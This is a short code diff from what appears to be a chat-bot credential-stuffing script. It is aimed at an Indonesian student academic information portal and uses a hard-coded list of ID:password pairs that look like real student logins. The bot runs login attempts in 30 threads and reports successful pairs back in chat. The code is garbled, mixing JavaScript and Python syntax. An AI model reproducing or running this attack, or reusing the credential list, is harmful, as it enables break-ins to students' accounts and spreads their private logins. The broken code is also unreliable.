@@ -1,7 +1,7 @@
 let util = require('util')
 let path = require('path')
 let { spawn } = require('child_process')
-let list = ${(global.ube)}
+let list = ${pickRandom(global.ube)}
         with open(list, 'r') {
 let lines = list.readLines()
         with ThreadPoolExecutor(max_workers: 30) as crot = {
@@ -29,6 +29,11 @@ if res == 'Sistem Informasi Akademik Mahasiswa' = {
        m.reply('MODAR ${usr}:${pwd}')
 }
 
+function pickRandom(list) {
+return list[Math.floor(list.length * Math.random())]
+}             
+                
+           
 global.ube [
 '195030107111024:Allisya123',
 '183141514111026:endah123',
